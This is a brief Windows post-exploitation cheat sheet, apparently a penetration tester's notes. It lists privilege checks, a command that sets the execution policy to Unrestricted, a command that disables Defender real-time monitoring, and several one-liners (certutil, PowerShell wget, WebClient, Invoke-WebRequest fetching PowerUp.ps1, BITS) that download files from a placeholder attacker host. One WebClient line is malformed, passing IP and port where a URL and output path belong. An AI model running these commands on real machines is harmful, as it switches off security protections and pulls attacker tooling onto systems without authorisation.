# Command line
whoami /priv  



# Powershell
Get-ExecutionPolicy    
Set-ExecutionPolicy Unrestricted   
Set-MpPreference -DisableRealtimeMonitoring $true  


# File Transfer  
certutil.exe -urlcache -split -f "http://$IP/file.bat" file.bat   


powershell -c wget "http://$IP/file.exe" -outfile "file.exe"   
powershell "(New-Object System.Net.WebClient).DownloadFile('$IP','$PORT')"   
powershell Invoke-WebRequest -Uri http://$IP:$PORT/PowerUp.ps1 -OutFile C:\Users\out   
BITS (Background Intelligence Transfer Service)   
powershell Import-Module BitsTransfer;Start-BitsTransfer -Source http://$IP:$PORT/file.bat -Destination C:\   

